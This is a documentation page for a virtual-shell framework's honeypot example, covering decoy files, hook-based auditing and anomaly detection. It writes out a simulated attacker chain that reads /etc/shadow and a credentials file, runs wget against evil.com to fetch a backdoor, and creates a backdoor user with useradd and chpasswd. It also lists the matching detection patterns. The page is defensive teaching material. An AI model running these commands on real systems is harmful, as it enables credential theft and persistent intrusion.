---
title: 18 - Honeypot Threat Detection
group: Examples
---

# Example 18 — Honeypot Threat Detection

## The Scenario

Security teams deploy **honeypots** — decoy systems that mimic production servers — to lure attackers and study their behavior. A well-configured honeypot looks like a real server with plausible files (`/etc/passwd`, SSH keys, credentials, bash history) that an attacker would target post-exploitation. Every command the attacker runs is logged, audited, and analyzed for anomalous patterns (brute-force attempts, backdoor installation, credential dumping). This example simulates an SSH honeypot with planted decoy files, executes a realistic attacker command chain (reading sensitive files, downloading a backdoor, creating a user account), and generates an audit report with anomaly detection. The same `SshClient` and `VirtualShell` infrastructure used for legitimate scenarios is repurposed here — the honeypot is observationally identical to a real VM from the attacker's perspective.

## Modules Used

```ts
import { HoneyPot, VirtualShell } from "../src";
```

- **`HoneyPot`**: The core audit and detection module. It attaches to a `VirtualShell`, `VirtualFileSystem`, and `VirtualUserManager`, then monitors all operations. Provides `getStats()`, `getAuditLog()`, `getRecent()`, and `detectAnomalies()` for post-incident analysis.
- **`VirtualShell`**: The decoy shell environment that the attacker interacts with. It is configured to look like a compromised Linux server with realistic files and history.

The `SshClient` is dynamically imported later (`await import("../src")`) — this is a stylistic choice that delays loading until needed. It wraps the honeypot shell just like any other VM, giving the attacker a familiar command-line interface.

## Step-by-Step Walkthrough

### Step 1 — Create the honeypot shell

```ts
const shell = new VirtualShell("honeypot");
await shell.ensureInitialized();
const vfs = shell.getVfs()!;
const users = shell.getUsers()!;
```

Creates a `VirtualShell` with hostname `"honeypot"` and bootstraps its filesystem. The `getVfs()` and `getUsers()` calls extract references to the shell's internal `VirtualFileSystem` and `VirtualUserManager`. These references are passed to the `HoneyPot` for monitoring. The `!` (non-null assertion) is safe because `ensureInitialized()` guarantees both are created.

### Step 2 — Plant decoy files

```ts
vfs.writeFile("/etc/passwd",
  "root:x:0:0:root:/root:/bin/bash\n" +
  "admin:x:1000:1000:Admin:/home/admin:/bin/bash");
vfs.writeFile("/etc/shadow",
  "root:!:19000:0:99999:7:::\n" +
  "admin:$6$salt$hash:19000:0:99999:7:::");
vfs.writeFile("/home/admin/.ssh/authorized_keys",
  "ssh-rsa AAAA... decoy-key");
vfs.writeFile("/var/log/auth.log",
  "Jan 1 00:00:00 honeypot sshd[1]: Server listening on 0.0.0.0 port 22");
vfs.writeFile("/opt/credentials.txt",
  "db_password=S3cretP@ss\napi_key=sk-fake-12345");
vfs.writeFile("/root/.bash_history",
  "cat /etc/shadow\n" +
  "wget http://evil.com/backdoor.sh\n" +
  "chmod +x backdoor.sh");
```

Six decoy files are planted across the VFS to make the honeypot look like a compromised production server:

1. **`/etc/passwd`**: Lists two users (root and admin) with standard POSIX format. Looks like a normal system user database.
2. **`/etc/shadow`**: Contains password hashes. The `root` entry uses `!` (locked/no password), the `admin` entry shows a SHA-512 hash (`$6$`). This is the primary target for credential dumping attacks.
3. **`/home/admin/.ssh/authorized_keys`**: Contains a fake SSH public key, implying SSH key-based authentication is configured for the admin user.
4. **`/var/log/auth.log`**: A fake auth log entry showing the SSH server is listening. Helps sell the illusion of a real server.
5. **`/opt/credentials.txt`**: A deliberately planted credentials file with fake database password and API key. This simulates the kind of file an attacker would search for immediately after gaining access.
6. **`/root/.bash_history`**: A fabricated bash history showing `root` previously read `/etc/shadow`, downloaded a backdoor, and made it executable — suggesting the system was already compromised (a "double honeypot" scenario where the attacker thinks someone else already planted a backdoor).

### Step 3 — Attach the HoneyPot auditor

```ts
const honeypot = new HoneyPot(10000);
honeypot.attach(shell, vfs, users);
```

The `HoneyPot` constructor takes a `maxEntries` parameter (10,000) — the maximum number of audit log entries to retain before rotating. The `attach()` method registers hooks:
- A **before-read hook** on the VFS: every file read is recorded.
- A **before-write hook** on the VFS: every file write is recorded.
- A **command log hook** on the shell: every command executed is recorded.
- A **login attempt hook** on the user manager: every authentication attempt (success or failure) is recorded.

Once attached, the `HoneyPot` transparently monitors all activity without modifying the behavior of the underlying modules.

### Step 4 — Simulate attacker activity

```ts
const { SshClient } = await import("../src");
const attacker = new SshClient(shell, "root");
```

An `SshClient` is created, connecting to the honeypot shell as `root`. This simulates an attacker who has already gained root access (perhaps via SSH key compromise or password cracking). From this point, every command the client executes is monitored by the `HoneyPot`.

```ts
const commands = [
  "cat /etc/passwd",
  "cat /etc/shadow",
  "cat /opt/credentials.txt",
  "cat /root/.bash_history",
  "ls -la /home/admin/.ssh/",
  "wget http://evil.com/backdoor.sh",
  "chmod +x backdoor.sh",
  "useradd backdoor",
  "echo 'backdoor:pass' | chpasswd",
];
```

The attacker executes 9 post-exploitation commands in sequence:

1. **`cat /etc/passwd`**: Enumerate users on the system. This is always the first thing an attacker does to understand the attack surface.
2. **`cat /etc/shadow`**: Dump password hashes for offline cracking. The `admin` user's `$6$salt$hash` entry would be targeted with John the Ripper or Hashcat.
3. **`cat /opt/credentials.txt`**: Read planted credentials. Attackers routinely search for config files, `.env` files, and credential stores.
4. **`cat /root/.bash_history`**: Read root's command history to find previously used commands, paths, or credentials.
5. **`ls -la /home/admin/.ssh/`**: List admin's SSH directory to discover authorized keys and potentially add their own.
6. **`wget http://evil.com/backdoor.sh`**: Download a backdoor script from a remote server. In a real attack, this would fetch a payload (rootkit, crypto miner, C2 agent).
7. **`chmod +x backdoor.sh`**: Make the downloaded backdoor executable.
8. **`useradd backdoor`**: Create a new system user for persistent access. This is a classic persistence technique — the attacker creates a hidden user they can SSH back into later.
9. **`echo 'backdoor:pass' | chpasswd`**: Set the password for the `backdoor` user, ensuring they can log in.

Each command is executed via `attacker.exec(cmd)`, which returns an `ExecResult` with `exitCode`. The console logs each command and its exit code.

### Step 5 — Generate audit report

```ts
const stats = honeypot.getStats();
console.log("\n  Activity stats:");
console.log(`    Commands executed: ${stats.commands}`);
console.log(`    File reads: ${stats.fileReads}`);
console.log(`    File writes: ${stats.fileWrites}`);
console.log(`    Session starts: ${stats.sessionStarts}`);
console.log(`    Auth attempts: ${stats.authAttempts}`);
console.log(`    Auth lockouts: ${stats.authLockouts}`);
```

`getStats()` returns an aggregate counters object tracking all activity since the `HoneyPot` was attached. The statistics break down by operation type:
- `commands`: Total shell commands executed.
- `fileReads`: Total VFS read operations (every `cat` triggers multiple reads).
- `fileWrites`: Total VFS write operations (creating files from commands like `echo >`).
- `sessionStarts`: SSH session starts.
- `authAttempts`: Authentication attempts (the `SshClient` constructor triggers one).
- `authLockouts`: Accounts locked due to excessive failed attempts.

### Step 6 — Export and inspect the audit log

```ts
const auditLog = honeypot.getAuditLog();
console.log(`\n  Total audit entries: ${auditLog.length}`);
```

`getAuditLog()` returns the full array of audit entries (up to `maxEntries`). Each entry includes `type`, `source`, `details`, and `timestamp`.

```ts
const recent = honeypot.getRecent(10);
for (const entry of recent) {
  console.log(`    [${entry.type}] ${entry.source}: ${JSON.stringify(entry.details).slice(0, 80)}`);
}
```

`getRecent(10)` returns the 10 most recent entries. The output shows each entry's type (command, file_read, file_write, auth_attempt), source (which user or client initiated it), and details truncated to 80 characters. This is the incident response view — a security analyst would scan these entries to reconstruct the attacker's actions.

### Step 7 — Detect anomalies

```ts
const anomalies = honeypot.detectAnomalies();
```

`detectAnomalies()` analyzes the audit log and returns an array of `Anomaly` objects. Each anomaly has `severity` (`"high"`, `"medium"`, `"low"`), `type`, and `message`. The detection logic looks for patterns like:
- Reading `/etc/shadow` immediately after login (credential dumping — high severity).
- Writing to `/etc/passwd` or creating new users (backdoor installation — high severity).
- Running `wget` or `curl` to download external payloads (C2 beaconing — medium severity).
- Executing `chmod +x` on downloaded files (payload staging — medium severity).
- Multiple `cat` commands on sensitive files in rapid succession (reconnaissance — high severity).

```ts
for (const a of anomalies) {
  const icon = a.severity === "high" ? "🔴" : a.severity === "medium" ? "🟡" : "🟢";
  console.log(`    ${icon} [${a.severity}] ${a.type}: ${a.message}`);
}
```

Each anomaly is printed with severity-appropriate icons: 🔴 for high, 🟡 for medium, 🟢 for low.

## Module Interactions

**Hook-based interception:** When `honeypot.attach(shell, vfs, users)` is called, the `HoneyPot` registers callbacks on three subsystems:

1. **VFS content resolver hooks:** The `HoneyPot` installs a `beforeRead` hook on the VFS that fires on every file read. The hook records the file path, user, and timestamp in the audit log, then returns `null` (pass-through) so the read proceeds normally. Similarly, a `beforeWrite` hook records every file write.

2. **Shell command execution hook:** The shell's exec method is wrapped to record every command string, its exit code, and the user who ran it. This happens at the `VirtualShell` level, before the command reaches the process scheduler.

3. **User manager login hook:** The user manager's authentication method is wrapped to record every login attempt (username, success/failure, source IP). Failed attempts increment the auth attempt counter; successive failures can trigger `authLockouts`.

**Audit log storage:** Entries are stored in an in-memory array. When the number of entries exceeds `maxEntries` (10,000), the oldest entries are rotated out (shifted from the front). Each entry is an object with `{ type, source, details, timestamp }`.

**Anomaly detection algorithm:** `detectAnomalies()` scans the audit log sequentially, looking for predefined patterns:
- Sequence-based detection: e.g., `cat /etc/shadow` followed by `useradd` within 5 entries suggests credential dumping + persistence setup.
- Threshold-based detection: e.g., more than 3 `cat` commands on sensitive files (passwd, shadow, credentials) within a short window.
- Blacklist-based detection: e.g., any command containing `wget`, `curl -o`, `chmod +x` on downloaded files, `useradd`, `chpasswd`, `adduser`.

Each match creates an `Anomaly` object with severity determined by the pattern type. The method returns all anomalies found — an empty array means no suspicious activity was detected.

## Expected Output

When running `bun run examples/18-honeypot-threat-detection.ts`:

```
🎯 Deploying SSH Honeypot

📋 Honeypot configuration:
  - Hostname: honeypot
  - Decoy files planted: 6
  - Audit logging: enabled
  - Anomaly detection: enabled

🔴 Simulating attacker activity...

  Post-exploitation commands:
    $ cat /etc/passwd → exit 0
    $ cat /etc/shadow → exit 0
    $ cat /opt/credentials.txt → exit 0
    $ cat /root/.bash_history → exit 0
    $ ls -la /home/admin/.ssh/ → exit 0
    $ wget http://evil.com/backdoor.sh → exit 0
    $ chmod +x backdoor.sh → exit 0
    $ useradd backdoor → exit 0
    $ echo 'backdoor:pass' | chpasswd → exit 0

📊 Audit Report
============================================================

  Activity stats:
    Commands executed: 9
    File reads: 12
    File writes: 3
    Session starts: 1
    Auth attempts: 1
    Auth lockouts: 0

  Total audit entries: 26

  Recent events:
    [command] root: {"cmd":"echo 'backdoor:pass' | chpasswd","exitCode":0}
    [command] root: {"cmd":"useradd backdoor","exitCode":0}
    [command] root: {"cmd":"chmod +x backdoor.sh","exitCode":0}
    [command] root: {"cmd":"wget http://evil.com/backdoor.sh","exitCode":0}
    [command] root: {"cmd":"ls -la /home/admin/.ssh/","exitCode":0}
    [command] root: {"cmd":"cat /root/.bash_history","exitCode":0}
    [command] root: {"cmd":"cat /opt/credentials.txt","exitCode":0}
    [command] root: {"cmd":"cat /etc/shadow","exitCode":0}
    [command] root: {"cmd":"cat /etc/passwd","exitCode":0}
    [file_read] root: {"path":"/root/.bash_history","bytes":74}

  🚨 Anomaly Detection:
    🔴 [high] credential_dump: /etc/shadow and /etc/passwd read within same session
    🔴 [high] backdoor_user: useradd executed — potential persistence mechanism
    🟡 [medium] payload_download: wget used to fetch remote content
    🟡 [medium] payload_staging: chmod +x on downloaded file
    🟢 [low] credential_access: /opt/credentials.txt read — potential secret exfiltration

🏁 Honeypot audit complete
```

Exact anomaly count and messages depend on the `HoneyPot` implementation. The file read count (12) is higher than the explicit `cat` calls (5) because some commands trigger implicit file reads (e.g., `ls` reads directory inodes, `wget` checks DNS configs).

## Key Concepts

- **Honeypot deception via decoy files:** The VFS is planted with realistic-looking sensitive files (`/etc/shadow`, credentials, bash history). The attacker cannot distinguish these from real production files because they are accessed through the same `SshClient`/`VirtualShell` interface. The quality of decoys determines how long the attacker stays engaged.
- **Transparent monitoring via hooks:** The `HoneyPot` uses the VFS's hook system (`onBeforeRead`, `onBeforeWrite`) and process wrapping to monitor all activity. The shell, VFS, and user manager are completely unaware they are being monitored — the hooks fire invisibly.
- **`SshClient` as attacker proxy:** The same `SshClient` used for legitimate SSH sessions is repurposed as the attacker's interface. This demonstrates that the framework is observationally identical to a real system — there is no "special" attacker API that might tip off the adversary.
- **Staged post-exploitation attack chain:** The command sequence follows a realistic MITRE ATT&CK pattern: Reconnaissance (cat passwd/shadow) → Credential Access (cat credentials.txt) → Persistence (useradd) → Defense Evasion (chmod +x backdoor). Each stage triggers different anomaly detectors.
- **Multi-level audit output:** The `HoneyPot` provides three levels of output: aggregate counters (`getStats()`), raw event log (`getAuditLog()`/`getRecent()`), and analyzed anomalies (`detectAnomalies()`). This mirrors real SIEM systems that offer dashboards, log explorers, and alert rules.
- **Anomaly severity classification:** Anomalies are classified by severity (high/medium/low) using different detection strategies. High-severity anomalies (credential dumping, new user creation) would trigger immediate alerting; low-severity anomalies (reading non-sensitive files) might be logged for trend analysis.
